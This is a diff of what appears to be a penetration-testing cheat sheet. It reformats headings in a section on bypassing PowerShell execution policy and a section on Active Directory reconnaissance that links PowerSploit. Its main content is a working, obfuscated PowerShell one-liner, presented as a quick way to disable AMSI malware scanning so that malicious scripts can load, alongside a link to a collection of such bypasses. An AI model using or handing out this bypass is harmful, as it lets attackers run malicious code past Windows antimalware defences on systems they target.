@@ -14,12 +14,12 @@
 
 
 <H2> Bypassing Powershell execution policy issues : </H2>
--> Github links - AMSI Bypass for loading malicious scripts: 
+<h3>Github links - AMSI Bypass for loading malicious scripts: <h3> 
   https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
--> Something that works quickly
+<h3> Something that works quickly </h3>
   sETItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE') ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL)."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ))."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
 
-<H2> Recon of active directory objects :
+<H2> Recon of active directory objects :</h2>
 -> PowerView / Powersploit :
   https://github.com/PowerShellMafia/PowerSploit
 
